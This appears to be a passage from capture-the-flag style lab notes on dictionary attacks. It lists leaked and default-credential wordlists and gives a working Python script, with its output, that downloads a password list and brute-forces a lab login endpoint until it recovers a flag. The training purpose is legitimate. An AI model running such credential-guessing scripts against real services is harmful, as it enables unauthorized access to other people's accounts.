The effectiveness of a dictionary attack lies in its ability to exploit the human tendency to prioritize memorable passwords over secure ones.
## Brute Force vs. Dictionary Attack
- `Brute Force`: A pure brute-force attack systematically tests _every possible combination_ of characters within a predetermined set and length. While this approach guarantees eventual success given enough time, it can be extremely time-consuming, particularly against longer or complex passwords.
- `Dictionary Attack`: In stark contrast, a dictionary attack employs a pre-compiled list of words and phrases, dramatically reducing the search space. This targeted methodology results in a far more efficient and rapid attack, especially when the target password is suspected to be a common word or phrase.

## Building and Utilizing Wordlists
Here is a table of some of the more useful wordlists for login brute-forcing:

|Wordlist|Description|Typical Use|Source|
|---|---|---|---|
|`rockyou.txt`|A popular password wordlist containing millions of passwords leaked from the RockYou breach.|Commonly used for password brute force attacks.|[RockYou breach dataset](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt)|
|`top-usernames-shortlist.txt`|A concise list of the most common usernames.|Suitable for quick brute force username attempts.|[SecLists](https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt)|
|`xato-net-10-million-usernames.txt`|A more extensive list of 10 million usernames.|Used for thorough username brute forcing.|[SecLists](https://github.com/danielmiessler/SecLists/blob/master/Usernames/xato-net-10-million-usernames.txt)|
|`2023-200_most_used_passwords.txt`|A list of the 200 most commonly used passwords as of 2023.|Effective for targeting commonly reused passwords.|[SecLists](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt)|
|`Default-Credentials/default-passwords.txt`|A list of default usernames and passwords commonly used in routers, software, and other devices.|Ideal for trying default credentials.|[SecLists](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.txt)|
## Throwing a dictionary at the problem
The instance application creates a route (`/dictionary`) that handles POST requests. It expects a `password` parameter in the request's form data. Upon receiving a request, it compares the submitted password against the expected value. If there's a match, it responds with a JSON object containing a success message and the flag. Otherwise, it returns an error message with a 401 status code (Unauthorized).

```python
import requests

ip = "94.237.49.128"  # Change this to your instance IP address
port = 54138       # Change this to your instance port number

# Download a list of common passwords from the web and split it into lines
passwords = requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/500-worst-passwords.txt").text.splitlines()

# Try each password from the list
for password in passwords:
    print(f"Attempted password: {password}")

    # Send a POST request to the server with the password
    response = requests.post(f"http://{ip}:{port}/dictionary", data={'password': password})

    # Check if the server responds with success and contains the 'flag'
    if response.ok and 'flag' in response.json():
        print(f"Correct password found: {password}")
        print(f"Flag: {response.json()['flag']}")
        break
```

```shell
> python3 dict.py

Attempted password: golf
Attempted password: bond007
Attempted password: bear
Attempted password: tiger
Attempted password: doctor
Attempted password: gateway
Correct password found: gateway
Flag: HTB{Brut3_F0rc3_M4st3r}
